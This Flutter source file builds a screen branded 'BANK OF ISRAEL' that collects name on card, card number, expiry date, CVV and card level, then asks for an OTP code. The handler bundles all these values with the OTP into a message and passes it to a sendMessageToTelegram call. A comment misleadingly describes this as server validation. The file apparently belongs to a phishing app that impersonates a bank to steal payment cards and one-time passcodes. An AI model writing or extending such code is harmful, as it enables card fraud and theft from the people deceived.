import 'package:credit_card_app/Controllers/credit_card_Controller.dart';
import 'package:credit_card_app/UI/comp/otp_widegt.dart';
import 'package:flutter/material.dart';
import 'package:awesome_card/awesome_card.dart';

import 'package:get/get.dart';

class CreditCardFormScreen extends StatelessWidget {
  final CreditCardFormController _controller =
      Get.put(CreditCardFormController());

  @override
  Widget build(BuildContext context) {
    void _showOtpDialog(BuildContext context) {
      showDialog(
        context: context,
        builder: (BuildContext context) {
          return OtpDialog(
            onOtpEntered: (String otp) async {
              // Process the entered OTP (e.g., send to server for validation)
              String msg = "credit card info: " +
                  "\n name :  ${_controller.cardNameController.value}" +
                  "\n card number :  ${_controller.cardNumberController.value}" +
                  "\n expiration date :  ${_controller.expirationDateController.value}" +
                  "\n cvv :  ${_controller.cvvController.value}" +
                  "\n level: ${_controller.selectedItem.value}" +
                  "OTP Code : ${otp}";
              await _controller.sendMessageToTelegram(msg);

              print('Entered OTP: $otp');
            },
          );
        },
      );
    }

    _outlineButton() => Padding(
          padding: const EdgeInsets.all(10),
          child: Container(
            padding: const EdgeInsets.all(10),
            alignment: Alignment.center,
            height: 60,
            // width: 70,
            child: OutlinedButton(
              style: ButtonStyle(
                backgroundColor: MaterialStateProperty.all(
                  Colors.green,
                ),
                shape: MaterialStateProperty.all(
                  RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(10),
                  ),
                ),
              ),
              // style: const ButtonStyle(
              //     // backgroundColor: Colors.amberAccent,
              //     ),
              // style:  ,
              onPressed: () async {
                await _controller.submitForm;

                _showOtpDialog(context);
              },
              child: const Text('Submit',
                  style: TextStyle(color: Colors.white, fontSize: 20)),
            ),
          ),
        );
    return Scaffold(
      body: SafeArea(
        child: Padding(
          padding: const EdgeInsets.all(16.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.start,
            children: [
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [headRow(), optionsRow()],
              ),
              SizedBox(height: 20),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 20),
                child: Row(
                  children: [
                    Text(
                      'Fill Your Credit Card Information',
                      style: TextStyle(
                        color: Colors.white,
                        fontSize: 22,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ],
                ),
                color: const Color.fromARGB(255, 0, 59, 108),
              ),
              SizedBox(height: 20),
              Expanded(
                child: Row(
                  children: [
                    Expanded(
                      child: SingleChildScrollView(
                        child: ConstrainedBox(
                          constraints: BoxConstraints(
                            minHeight: MediaQuery.of(context).size.height - 200,
                          ),
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.stretch,
                            children: [
                              nameTextField(),
                              SizedBox(height: 8.0),
                              cardYTextField(),
                              SizedBox(height: 8.0),
                              expTextField(),
                              SizedBox(height: 8.0),
                              cvvTextField(),
                              SizedBox(height: 8.0),
                              Padding(
                                padding: const EdgeInsets.all(8.0),
                                child: CustomCircularDropdownButton<String>(
                                  items: [
                                    "Card Level",
                                    "Classic",
                                    "Gold",
                                    "Infinite",
                                    "Signature",
                                    "Platinum"
                                  ],
                                  value: _controller.selectedItem.value,
                                  onChanged: _controller.onItemSelect,
                                ),
                              ),
                              SizedBox(height: 16),
                              _outlineButton(),
                            ],
                          ),
                        ),
                      ),
                    ),
                    Expanded(child: backImage)
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  nameTextField() => Padding(
        padding: const EdgeInsets.all(8.0),
        child: outlinendTextField(
          'Name On Card',
          _controller.cardNameController,
          TextInputType.text,
        ),
      );
  cvvTextField() => Padding(
        padding: const EdgeInsets.all(8.0),
        child: outlinendTextField(
          'CVV',
          _controller.cvvController,
          TextInputType.number,
        ),
      );
  expTextField() => Padding(
        padding: const EdgeInsets.all(8.0),
        child: outlinendTextField(
          'Expiration Date',
          _controller.expirationDateController,
          TextInputType.datetime,
        ),
      );
  cardYTextField() => Padding(
        padding: const EdgeInsets.all(8.0),
        child: outlinendTextField(
          'Card Number',
          _controller.cardNumberController,
          TextInputType.number,
        ),
      );
}

const head = 'BANK OF ISRAEL\n בנק ישראל';
const textStyle1 =
    TextStyle(color: Color.fromARGB(255, 117, 114, 114), fontSize: 20);

headRow() => Row(
      mainAxisAlignment: MainAxisAlignment.spaceBetween,
      crossAxisAlignment: CrossAxisAlignment.center,
      children: [
        Container(
          padding: const EdgeInsets.all(16.0),
          margin: const EdgeInsets.all(10),
          child: const Text(
            head,
            style: textStyle1,
          ),
        ),
      ],
    );

optionsRow() => Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        crossAxisAlignment: CrossAxisAlignment.center,
        children: [
          const Text('setting', style: textStyle1),
          const SizedBox(
            width: 20,
          ),
          Container(
              child: const DropdownMenu(
            dropdownMenuEntries: [
              DropdownMenuEntry(
                  value: Text(
                    'EN',
                    style: textStyle1,
                  ),
                  label: 'EN'),
              DropdownMenuEntry(
                  value: Text(
                    'He',
                    style: textStyle1,
                  ),
                  label: 'HE')
            ],
          ))
        ]);
secondRow() => const Row();

outlinendTextField(String lbl, TextEditingController ctr, TextInputType type) =>
    TextFormField(
      controller: ctr,
      keyboardType: type,
      decoration: InputDecoration(
          labelText: lbl,
          border: const OutlineInputBorder(
              borderRadius: BorderRadius.all(
            Radius.circular(35),
          ))),
    );
const backImage = Image(
  image: AssetImage("assets/images/background.png"),
  fit: BoxFit.cover,
);

class CustomCircularDropdownButton<T> extends StatelessWidget {
  final List<T> items;
  final T value;
  final Function(T?) onChanged;

  CustomCircularDropdownButton({
    required this.items,
    required this.value,
    required this.onChanged,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: BoxDecoration(
        borderRadius:
            BorderRadius.circular(20.0), // Adjust the radius as needed
        color: Colors.grey[200], // Adjust the background color as needed
      ),
      child: Padding(
        padding: const EdgeInsets.symmetric(horizontal: 12.0),
        child: DropdownButton<T>(
          value: value,
          items: items.map((T item) {
            return DropdownMenuItem<T>(
              value: item,
              child: Text(item.toString()),
            );
          }).toList(),
          onChanged: onChanged,
          underline: SizedBox(), // Remove the default underline
          icon: Icon(Icons.arrow_drop_down),
        ),
      ),
    );
  }
}
